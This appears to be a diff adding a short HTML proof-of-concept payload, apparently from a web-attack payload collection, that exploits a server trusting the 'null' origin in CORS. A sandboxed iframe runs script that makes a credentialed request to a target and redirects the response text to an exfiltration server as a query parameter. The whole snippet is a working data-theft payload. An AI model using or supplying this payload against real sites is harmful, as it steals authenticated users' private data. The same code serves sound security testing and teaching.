@@ -1,0 +1,11 @@
+<!-- If server applies null origin -->
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','example.com',true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener() {
+      location='exfiltration-server.com/log?key='+encodeURIComponent(this.responseText);
+  };
+</script>"></iframe>
